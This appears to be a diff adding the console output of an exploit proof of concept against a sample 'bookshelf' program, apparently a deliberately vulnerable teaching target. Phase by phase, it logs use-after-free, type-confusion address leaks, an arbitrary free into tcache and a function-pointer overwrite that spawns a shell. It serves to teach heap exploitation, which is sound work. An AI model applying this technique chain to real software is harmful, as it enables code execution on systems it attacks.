@@ -1,0 +1,601 @@
+$ python poc.py 
+Starting 2-Bookshelf Sample Bookshelf...
+[+] Starting local process './bookshelf': pid 39651
+
+======================================================================
+PHASE 0: Initial Heap State
+======================================================================
+================================================================
+                    HEAP VISUALIZATION                          
+================================================================
+[ACTIVE STRUCTURES]
+  Type                 Address            Size
+  ----                 -------            ----
+  Author struct        0x5bd01cc692a0 72 bytes
+    ├─ name             0x5bd01cc692f0 13 bytes
+    ├─ publisher        0x5bd01cc69310 21 bytes
+    └─ description      0x5bd01cc69330 529 bytes
+  Book struct          0x5bd01cc69860 56 bytes
+    ├─ author ref:   0x5bd01cc692a0
+    ├─ name             0x5bd01cc698a0 23 bytes
+    └─ description      0x5bd01cc698c0 313 bytes
+  Book struct          0x5bd01cc69700 56 bytes
+    ├─ author ref:   0x5bd01cc692a0
+    ├─ name             0x5bd01cc69740 15 bytes
+    └─ description      0x5bd01cc69760 237 bytes
+  Book struct          0x5bd01cc69550 56 bytes
+    ├─ author ref:   0x5bd01cc692a0
+    ├─ name             0x5bd01cc69590 27 bytes
+    └─ description      0x5bd01cc695c0 306 bytes
+  Review struct        0x5bd01cc69a70 40 bytes
+    ├─ book ref:     0x5bd01cc69860
+    ├─ author ref:   0x5bd01cc692a0
+    └─ rating:       5
+  Review struct        0x5bd01cc69a40 40 bytes
+    ├─ book ref:     0x5bd01cc69700
+    ├─ author ref:   0x5bd01cc692a0
+    └─ rating:       5
+  Review struct        0x5bd01cc69a10 40 bytes
+    ├─ book ref:     0x5bd01cc69550
+    ├─ author ref:   0x5bd01cc692a0
+    └─ rating:       5
+================================================================
+
+Press enter to continue...
+
+======================================================================
+PHASE 1: Heap Grooming
+======================================================================
+  [-] Deleted book: The Two Towers...
+================================================================
+                    HEAP VISUALIZATION                          
+================================================================
+[ACTIVE STRUCTURES]
+  Type                 Address            Size
+  ----                 -------            ----
+  Author struct        0x5bd01cc692a0 72 bytes
+    ├─ name             0x5bd01cc692f0 13 bytes
+    ├─ publisher        0x5bd01cc69310 21 bytes
+    └─ description      0x5bd01cc69330 529 bytes
+  Book struct          0x5bd01cc69860 56 bytes
+    ├─ author ref:   0x5bd01cc692a0
+    ├─ name             0x5bd01cc698a0 23 bytes
+    └─ description      0x5bd01cc698c0 313 bytes
+  Book struct          0x5bd01cc69550 56 bytes
+    ├─ author ref:   0x5bd01cc692a0
+    ├─ name             0x5bd01cc69590 27 bytes
+    └─ description      0x5bd01cc695c0 306 bytes
+  Review struct        0x5bd01cc69a70 40 bytes
+    ├─ book ref:     0x5bd01cc69860
+    ├─ author ref:   0x5bd01cc692a0
+    └─ rating:       5
+  Review struct        0x5bd01cc69a10 40 bytes
+    ├─ book ref:     0x5bd01cc69550
+    ├─ author ref:   0x5bd01cc692a0
+    └─ rating:       5
+================================================================
+
+Press enter to continue...
+
+Creating author (Ax55), author's name reclaims freed book memory
+  [+] Created author: AAAAAAAAAAAAAAAAAAAA...
+[NOTE] Author's name is in reclaimed book location, due to same size
+Press enter to continue...
+
+Creating book (BOOK0), will have pointer to author Ax55
+  [+] Created book: BOOK0... by AAAAAAAAAAAAAAAAAAAA...
+================================================================
+                    HEAP VISUALIZATION                          
+================================================================
+[ACTIVE STRUCTURES]
+  Type                 Address            Size
+  ----                 -------            ----
+  Author struct        0x5bd01cc6af10 72 bytes
+    ├─ name             0x5bd01cc69700 56 bytes
+    ├─ publisher        0x5bd01cc69740 6 bytes
+    └─ description      0x5bd01cc6af60 6 bytes
+  Author struct        0x5bd01cc692a0 72 bytes
+    ├─ name             0x5bd01cc692f0 13 bytes
+    ├─ publisher        0x5bd01cc69310 21 bytes
+    └─ description      0x5bd01cc69330 529 bytes
+  Book struct          0x5bd01cc6af80 56 bytes
+    ├─ author ref:   0x5bd01cc6af10
+    ├─ name             0x5bd01cc6afc0 6 bytes
+    └─ description      0x5bd01cc6afe0 6 bytes
+  Book struct          0x5bd01cc69860 56 bytes
+    ├─ author ref:   0x5bd01cc692a0
+    ├─ name             0x5bd01cc698a0 23 bytes
+    └─ description      0x5bd01cc698c0 313 bytes
+  Book struct          0x5bd01cc69550 56 bytes
+    ├─ author ref:   0x5bd01cc692a0
+    ├─ name             0x5bd01cc69590 27 bytes
+    └─ description      0x5bd01cc695c0 306 bytes
+  Review struct        0x5bd01cc69a70 40 bytes
+    ├─ book ref:     0x5bd01cc69860
+    ├─ author ref:   0x5bd01cc692a0
+    └─ rating:       5
+  Review struct        0x5bd01cc69a10 40 bytes
+    ├─ book ref:     0x5bd01cc69550
+    ├─ author ref:   0x5bd01cc692a0
+    └─ rating:       5
+================================================================
+
+[NOTE] Book points to author Ax55
+Press enter to continue...
+
+======================================================================
+PHASE 2: Create Stale Reference (WMI-1)
+======================================================================
+Creating stale author reference in BOOK0, by deleting author Ax55.
+  [-] Deleted author: AAAAAAAAAAAAAAAAAAAA...
+[WMI-1] STALE REFERENCE CREATED
+================================================================
+                    HEAP VISUALIZATION                          
+================================================================
+[ACTIVE STRUCTURES]
+  Type                 Address            Size
+  ----                 -------            ----
+  Author struct        0x5bd01cc692a0 72 bytes
+    ├─ name             0x5bd01cc692f0 13 bytes
+    ├─ publisher        0x5bd01cc69310 21 bytes
+    └─ description      0x5bd01cc69330 529 bytes
+  Book struct          0x5bd01cc6af80 56 bytes
+    ├─ author ref:   0x5bd01cc6af10
+    ├─ name             0x5bd01cc6afc0 6 bytes
+    └─ description      0x5bd01cc6afe0 6 bytes
+  Book struct          0x5bd01cc69860 56 bytes
+    ├─ author ref:   0x5bd01cc692a0
+    ├─ name             0x5bd01cc698a0 23 bytes
+    └─ description      0x5bd01cc698c0 313 bytes
+  Book struct          0x5bd01cc69550 56 bytes
+    ├─ author ref:   0x5bd01cc692a0
+    ├─ name             0x5bd01cc69590 27 bytes
+    └─ description      0x5bd01cc695c0 306 bytes
+  Review struct        0x5bd01cc69a70 40 bytes
+    ├─ book ref:     0x5bd01cc69860
+    ├─ author ref:   0x5bd01cc692a0
+    └─ rating:       5
+  Review struct        0x5bd01cc69a10 40 bytes
+    ├─ book ref:     0x5bd01cc69550
+    ├─ author ref:   0x5bd01cc692a0
+    └─ rating:       5
+================================================================
+
+[NOTE] BOOK0 still has a pointer to author Ax55.
+Press enter to continue...
+
+======================================================================
+PHASE 3: Leak via Type Confusion (WMI-2) - Heap Address
+======================================================================
+Reclaiming author's name memory with book.
+[NOTE] The stale author->name pointer will accessed via data in Bx39.
+
+Creating book (Bx39) to control leaked data...
+  [+] Created book: BBBBBBBBBBBBBBBBBBBB... by J.R. Tolkien...
+[LEAK SETUP]
+  BOOK0->author points to freed Ax55 location
+  Ax55 + 0x10 (name pointer field) was pointing to AUTH0->name memory
+  Ax55 name's memory is now the Bx39 struct
+  First 8 bytes of Bx39 struct is the pointer to Bx39 name
+  Therefore: reading author name in BOOK0 listing leaks Bx39 name address
+
+Reading through stale reference to leak heap address.
+[WMI-2] HEAP LEAK SUCCESS: 0x5bd01cc69a40
+[NOTE] This leak can be used to determine the function table location.
+================================================================
+                    HEAP VISUALIZATION                          
+================================================================
+[ACTIVE STRUCTURES]
+  Type                 Address            Size
+  ----                 -------            ----
+  Author struct        0x5bd01cc692a0 72 bytes
+    ├─ name             0x5bd01cc692f0 13 bytes
+    ├─ publisher        0x5bd01cc69310 21 bytes
+    └─ description      0x5bd01cc69330 529 bytes
+  Book struct          0x5bd01cc69700 56 bytes
+    ├─ author ref:   0x5bd01cc692a0
+    ├─ name             0x5bd01cc69a40 40 bytes
+    └─ description      0x5bd01cc6af60 6 bytes
+  Book struct          0x5bd01cc6af80 56 bytes
+    ├─ author ref:   0x5bd01cc6af10
+    ├─ name             0x5bd01cc6afc0 6 bytes
+    └─ description      0x5bd01cc6afe0 6 bytes
+  Book struct          0x5bd01cc69860 56 bytes
+    ├─ author ref:   0x5bd01cc692a0
+    ├─ name             0x5bd01cc698a0 23 bytes
+    └─ description      0x5bd01cc698c0 313 bytes
+  Book struct          0x5bd01cc69550 56 bytes
+    ├─ author ref:   0x5bd01cc692a0
+    ├─ name             0x5bd01cc69590 27 bytes
+    └─ description      0x5bd01cc695c0 306 bytes
+  Review struct        0x5bd01cc69a70 40 bytes
+    ├─ book ref:     0x5bd01cc69860
+    ├─ author ref:   0x5bd01cc692a0
+    └─ rating:       5
+  Review struct        0x5bd01cc69a10 40 bytes
+    ├─ book ref:     0x5bd01cc69550
+    ├─ author ref:   0x5bd01cc692a0
+    └─ rating:       5
+================================================================
+
+Press enter to continue...
+
+======================================================================
+PHASE 3: Leak via Type Confusion (WMI-2) - Code Location (WHERE)
+======================================================================
+[NOTE] Construct book that has a fake author struct in it's description.
+[NOTE] Description will be allocated on reclaimed author Ax55 struct memory
+
+[CALCULATION] Function table at leaked address + 0x60 = 0x5bd01cc69aa0
+[NOTE] Offset of 0x60 determined by initialize heap allocations
+       (author, 3 books, 3 reviews, function table)
+
+Creating book BOOK2 with crafted author struct in the description
+  Fake author->name will point to function table
+  [+] Created book: BOOK2... by J.R. Tolkien...
+[LEAK SETUP]
+  BOOK2->desc reclaims author Ax55 memory
+  Ax55 + 0x10 (name pointer field) is now fake author struct with pointer to
+  function table
+  Therefore: reading author name in BOOK0 listing leaks first address
+  in function table: menu_print_authors
+
+Reading through stale reference to leak code address...
+[WMI-2] CODE LEAK SUCCESS: 0x5bcfec6c2b58
+[NOTE] This is the address of menu_print_authors function
+[NOTE] We can calculate other code addresses from this base statically
+================================================================
+                    HEAP VISUALIZATION                          
+================================================================
+[ACTIVE STRUCTURES]
+  Type                 Address            Size
+  ----                 -------            ----
+  Author struct        0x5bd01cc692a0 72 bytes
+    ├─ name             0x5bd01cc692f0 13 bytes
+    ├─ publisher        0x5bd01cc69310 21 bytes
+    └─ description      0x5bd01cc69330 529 bytes
+  Book struct          0x5bd01cc6b000 56 bytes
+    ├─ author ref:   0x5bd01cc692a0
+    ├─ name             0x5bd01cc69740 6 bytes
+    └─ description      0x5bd01cc6af10 23 bytes
+  Book struct          0x5bd01cc69700 56 bytes
+    ├─ author ref:   0x5bd01cc692a0
+    ├─ name             0x5bd01cc69a40 40 bytes
+    └─ description      0x5bd01cc6af60 6 bytes
+  Book struct          0x5bd01cc6af80 56 bytes
+    ├─ author ref:   0x5bd01cc6af10
+    ├─ name             0x5bd01cc6afc0 6 bytes
+    └─ description      0x5bd01cc6afe0 6 bytes
+  Book struct          0x5bd01cc69860 56 bytes
+    ├─ author ref:   0x5bd01cc692a0
+    ├─ name             0x5bd01cc698a0 23 bytes
+    └─ description      0x5bd01cc698c0 313 bytes
+  Book struct          0x5bd01cc69550 56 bytes
+    ├─ author ref:   0x5bd01cc692a0
+    ├─ name             0x5bd01cc69590 27 bytes
+    └─ description      0x5bd01cc695c0 306 bytes
+  Review struct        0x5bd01cc69a70 40 bytes
+    ├─ book ref:     0x5bd01cc69860
+    ├─ author ref:   0x5bd01cc692a0
+    └─ rating:       5
+  Review struct        0x5bd01cc69a10 40 bytes
+    ├─ book ref:     0x5bd01cc69550
+    ├─ author ref:   0x5bd01cc692a0
+    └─ rating:       5
+================================================================
+
+Press enter to continue...
+
+======================================================================
+PHASE 4: Heap Grooming
+======================================================================
+[NOTE] We'll create a fake review struct that overlaps the function table.
+[NOTE] Then use the arbitrary free primitive to add it to tcache.
+
+Preparing heap layout for fake chunk.
+
+Deleting book: The Return of the King.
+  [-] Deleted book: The Return of the Ki...
+
+Deleting book: Bx39.
+  [-] Deleted book: BBBBBBBBBBBBBBBBBBBB...
+
+Creating author (AUTHOR1) for 2nd stale reference.
+  [+] Created author: AUTHOR1...
+
+Creating book (BOOK3) to control leaked data...
+  [+] Created book: BOOK3... by AUTHOR1...
+================================================================
+                    HEAP VISUALIZATION                          
+================================================================
+[ACTIVE STRUCTURES]
+  Type                 Address            Size
+  ----                 -------            ----
+  Author struct        0x5bd01cc6b040 72 bytes
+    ├─ name             0x5bd01cc6af60 8 bytes
+    ├─ publisher        0x5bd01cc698a0 6 bytes
+    └─ description      0x5bd01cc6b090 6 bytes
+  Author struct        0x5bd01cc692a0 72 bytes
+    ├─ name             0x5bd01cc692f0 13 bytes
+    ├─ publisher        0x5bd01cc69310 21 bytes
+    └─ description      0x5bd01cc69330 529 bytes
+  Book struct          0x5bd01cc69700 56 bytes
+    ├─ author ref:   0x5bd01cc6b040
+    ├─ name             0x5bd01cc6b0b0 6 bytes
+    └─ description      0x5bd01cc6b0d0 6 bytes
+  Book struct          0x5bd01cc6b000 56 bytes
+    ├─ author ref:   0x5bd01cc692a0
+    ├─ name             0x5bd01cc69740 6 bytes
+    └─ description      0x5bd01cc6af10 23 bytes
+  Book struct          0x5bd01cc6af80 56 bytes
+    ├─ author ref:   0x5bd01cc6af10
+    ├─ name             0x5bd01cc6afc0 6 bytes
+    └─ description      0x5bd01cc6afe0 6 bytes
+  Book struct          0x5bd01cc69550 56 bytes
+    ├─ author ref:   0x5bd01cc692a0
+    ├─ name             0x5bd01cc69590 27 bytes
+    └─ description      0x5bd01cc695c0 306 bytes
+  Review struct        0x5bd01cc69a10 40 bytes
+    ├─ book ref:     0x5bd01cc69550
+    ├─ author ref:   0x5bd01cc692a0
+    └─ rating:       5
+================================================================
+
+Press enter to continue...
+
+======================================================================
+PHASE 5: Create Stale Reference (WMI-1)
+======================================================================
+
+Creating second stale reference...
+  [-] Deleted author: AUTHOR1...
+[WMI-1] SECOND STALE REFERENCE CREATED
+  BOOK3->author points to freed AUTHOR1
+================================================================
+                    HEAP VISUALIZATION                          
+================================================================
+[ACTIVE STRUCTURES]
+  Type                 Address            Size
+  ----                 -------            ----
+  Author struct        0x5bd01cc692a0 72 bytes
+    ├─ name             0x5bd01cc692f0 13 bytes
+    ├─ publisher        0x5bd01cc69310 21 bytes
+    └─ description      0x5bd01cc69330 529 bytes
+  Book struct          0x5bd01cc69700 56 bytes
+    ├─ author ref:   0x5bd01cc6b040
+    ├─ name             0x5bd01cc6b0b0 6 bytes
+    └─ description      0x5bd01cc6b0d0 6 bytes
+  Book struct          0x5bd01cc6b000 56 bytes
+    ├─ author ref:   0x5bd01cc692a0
+    ├─ name             0x5bd01cc69740 6 bytes
+    └─ description      0x5bd01cc6af10 23 bytes
+  Book struct          0x5bd01cc6af80 56 bytes
+    ├─ author ref:   0x5bd01cc6af10
+    ├─ name             0x5bd01cc6afc0 6 bytes
+    └─ description      0x5bd01cc6afe0 6 bytes
+  Book struct          0x5bd01cc69550 56 bytes
+    ├─ author ref:   0x5bd01cc692a0
+    ├─ name             0x5bd01cc69590 27 bytes
+    └─ description      0x5bd01cc695c0 306 bytes
+  Review struct        0x5bd01cc69a10 40 bytes
+    ├─ book ref:     0x5bd01cc69550
+    ├─ author ref:   0x5bd01cc692a0
+    └─ rating:       5
+================================================================
+
+Press enter to continue...
+
+======================================================================
+PHASE 6: Heap Grooming - Construct Fake Authors
+======================================================================
+[NOTE] Building a fake chunk header that will pass allocator checks.
+[NOTE] This fake chunk will overlap with the function pointer table.
+
+[FAKE CHUNK CONSTRUCTION]
+  Link book addr: 0x5bd01cc69700)
+  Fake chunk addr: 0x5bd01cc69a70
+  Fake Review addr: 0x5bd01cc69a70
+  Link pointers crafted to avoid crashes during unlink
+
+Creating book BOOK4 with fake chunk in the description
+  [+] Created book: BOOK4... by J.R. Tolkien...
+
+Creating book BOOK5 with fake review struct in the description
+  [+] Created book: BOOK5... by J.R. Tolkien...
+[NOTE] Overwriting stale author's review list to point to fake chunk.
+[NOTE] Deleting the book will free all reviews including our fake one.
+  Setting author->reviews.forward = 0x5bd01cc69a70
+
+Creating book BOOK6 with crafted author struct in the description
+  [+] Created book: BOOK6... by J.R. Tolkien...
+================================================================
+                    HEAP VISUALIZATION                          
+================================================================
+[ACTIVE STRUCTURES]
+  Type                 Address            Size
+  ----                 -------            ----
+  Author struct        0x5bd01cc692a0 72 bytes
+    ├─ name             0x5bd01cc692f0 13 bytes
+    ├─ publisher        0x5bd01cc69310 21 bytes
+    └─ description      0x5bd01cc69330 529 bytes
+  Book struct          0x5bd01cc6b130 56 bytes
+    ├─ author ref:   0x5bd01cc692a0
+    ├─ name             0x5bd01cc6af60 6 bytes
+    └─ description      0x5bd01cc6b040 41 bytes
+  Book struct          0x5bd01cc6b0f0 56 bytes
+    ├─ author ref:   0x5bd01cc692a0
+    ├─ name             0x5bd01cc698a0 6 bytes
+    └─ description      0x5bd01cc69a70 7 bytes
+  Book struct          0x5bd01cc69860 56 bytes
+    ├─ author ref:   0x5bd01cc692a0
+    ├─ name             0x5bd01cc6b090 6 bytes
+    └─ description      0x5bd01cc69a40 19 bytes
+  Book struct          0x5bd01cc69700 56 bytes
+    ├─ author ref:   0x5bd01cc6b040
+    ├─ name             0x5bd01cc6b0b0 6 bytes
+    └─ description      0x5bd01cc6b0d0 6 bytes
+  Book struct          0x5bd01cc6b000 56 bytes
+    ├─ author ref:   0x5bd01cc692a0
+    ├─ name             0x5bd01cc69740 6 bytes
+    └─ description      0x5bd01cc6af10 23 bytes
+  Book struct          0x5bd01cc6af80 56 bytes
+    ├─ author ref:   0x5bd01cc6af10
+    ├─ name             0x5bd01cc6afc0 6 bytes
+    └─ description      0x5bd01cc6afe0 6 bytes
+  Book struct          0x5bd01cc69550 56 bytes
+    ├─ author ref:   0x5bd01cc692a0
+    ├─ name             0x5bd01cc69590 27 bytes
+    └─ description      0x5bd01cc695c0 306 bytes
+  Review struct        0x5bd01cc69a10 40 bytes
+    ├─ book ref:     0x5bd01cc69550
+    ├─ author ref:   0x5bd01cc692a0
+    └─ rating:       5
+================================================================
+
+Press enter to continue...
+
+======================================================================
+PHASE 7: Trigger Arbitrary Free (WMI-3)
+======================================================================
+
+Triggering arbitrary free through review deletion...
+[NOTE] Deleting BOOK3, follows stale author->reviews->fake reviews and deletes them.
+
+Deleting book: BOOK3.
+  [-] Deleted book: BOOK3...
+[WMI-3] ARBITRARY FREE EXECUTED
+================================================================
+                    HEAP VISUALIZATION                          
+================================================================
+[ACTIVE STRUCTURES]
+  Type                 Address            Size
+  ----                 -------            ----
+  Author struct        0x5bd01cc692a0 72 bytes
+    ├─ name             0x5bd01cc692f0 13 bytes
+    ├─ publisher        0x5bd01cc69310 21 bytes
+    └─ description      0x5bd01cc69330 529 bytes
+  Book struct          0x5bd01cc6b130 56 bytes
+    ├─ author ref:   0x5bd01cc692a0
+    ├─ name             0x5bd01cc6af60 6 bytes
+    └─ description      0x5bd01cc6b040 41 bytes
+  Book struct          0x5bd01cc6b0f0 56 bytes
+    ├─ author ref:   0x5bd01cc692a0
+    ├─ name             0x5bd01cc698a0 6 bytes
+    └─ description      0x5bd01cc69a70 1 bytes
+  Book struct          0x5bd01cc69860 56 bytes
+    ├─ author ref:   0x5bd01cc692a0
+    ├─ name             0x5bd01cc6b090 6 bytes
+    └─ description      0x5bd01cc69a40 19 bytes
+  Book struct          0x5bd01cc6b000 56 bytes
+    ├─ author ref:   0x5bd01cc692a0
+    ├─ name             0x5bd01cc69740 6 bytes
+    └─ description      0x5bd01cc6af10 23 bytes
+  Book struct          0x5bd01cc6af80 56 bytes
+    ├─ author ref:   0x5bd01cc6af10
+    ├─ name             0x5bd01cc6afc0 6 bytes
+    └─ description      0x5bd01cc6afe0 6 bytes
+  Book struct          0x5bd01cc69550 56 bytes
+    ├─ author ref:   0x5bd01cc692a0
+    ├─ name             0x5bd01cc69590 27 bytes
+    └─ description      0x5bd01cc695c0 306 bytes
+  Review struct        0x5bd01cc69a10 40 bytes
+    ├─ book ref:     0x5bd01cc69550
+    ├─ author ref:   0x5bd01cc692a0
+    └─ rating:       5
+================================================================
+
+Press enter to continue...
+  Fake chunk at 0x5bd01cc69a58 added to tcache
+
+======================================================================
+PHASE 8: Write-What-Where - Function Pointer Overwrite (WMI-4)
+======================================================================
+[NOTE] Allocating large enough description will reclaim function table.
+[NOTE] Placing win function at offset 0x40, 0x48 overwrite menu 1 and 2.
+[*] Calculated offset: 0x7cf
+
+[TARGET CALCULATION]
+  Function table starts at: 0x5bd01cc69aa0
+  Win function (shell) at: 0x5bcfec6c2389
+  Overwriting first 2 menu functions with win func address
+
+Creating PWN0 book to overwrite function pointers...
+  [+] Created book: PWN0... by J.R. Tolkien...
+[WMI-4] WRITE-WHAT-WHERE COMPLETE
+================================================================
+                    HEAP VISUALIZATION                          
+================================================================
+[ACTIVE STRUCTURES]
+  Type                 Address            Size
+  ----                 -------            ----
+  Author struct        0x5bd01cc692a0 72 bytes
+    ├─ name             0x5bd01cc692f0 13 bytes
+    ├─ publisher        0x5bd01cc69310 21 bytes
+    └─ description      0x5bd01cc69330 529 bytes
+  Book struct          0x5bd01cc69700 56 bytes
+    ├─ author ref:   0x5bd01cc692a0
+    ├─ name             0x5bd01cc6b0d0 5 bytes
+    └─ description      0x5bd01cc69a60 10 bytes
+  Book struct          0x5bd01cc6b130 56 bytes
+    ├─ author ref:   0x5bd01cc692a0
+    ├─ name             0x5bd01cc6af60 6 bytes
+    └─ description      0x5bd01cc6b040 41 bytes
+  Book struct          0x5bd01cc6b0f0 56 bytes
+    ├─ author ref:   0x5bd01cc692a0
+    ├─ name             0x5bd01cc698a0 6 bytes
+    └─ description      0x5bd01cc69a70 42 bytes
+  Book struct          0x5bd01cc69860 56 bytes
+    ├─ author ref:   0x5bd01cc692a0
+    ├─ name             0x5bd01cc6b090 6 bytes
+    └─ description      0x5bd01cc69a40 19 bytes
+  Book struct          0x5bd01cc6b000 56 bytes
+    ├─ author ref:   0x5bd01cc692a0
+    ├─ name             0x5bd01cc69740 6 bytes
+    └─ description      0x5bd01cc6af10 23 bytes
+  Book struct          0x5bd01cc6af80 56 bytes
+    ├─ author ref:   0x5bd01cc6af10
+    ├─ name             0x5bd01cc6afc0 6 bytes
+    └─ description      0x5bd01cc6afe0 6 bytes
+  Book struct          0x5bd01cc69550 56 bytes
+    ├─ author ref:   0x5bd01cc692a0
+    ├─ name             0x5bd01cc69590 27 bytes
+    └─ description      0x5bd01cc695c0 306 bytes
+  Review struct        0x5bd01cc69a10 40 bytes
+    ├─ book ref:     0x5bd01cc69550
+    ├─ author ref:   0x5bd01cc692a0
+    └─ rating:       5
+================================================================
+
+Press enter to continue...
+  Function pointer table successfully overwritten
+
+======================================================================
+PHASE 9: Control Flow Hijack - Trigger Overwritten Function Pointer
+======================================================================
+
+======================================================================
+EXPLOITATION COMPLETE!
+
+WMP Chain Successfully Executed:
+  1. Stale Reference
+  2. Leak via Type Confusion
+  3. Stale Reference
+  4. Leak via Type Confusion
+  5. Arbitrary Free (control review list)
+  6. Write-What-Where (overwrite function table)
+======================================================================
+
+[NOTE] Calling menu 1 or 2 will now execute our shell...
+
+Triggering shell by selecting menu option 1...
+
+Press enter to continue. Enter 'ls' or similar to verify shell. Exit or ctrl-c to finish
+[*] Switching to interactive mode
+
+
+$ ls
+bookshelf    bookshelf.h  main.c  Makefile    output
+bookshelf.c  bookshelf.o  main.o  mitigation  poc.py
+$ 
+[*] Interrupted
+[*] Stopped process './bookshelf' (pid 39651)
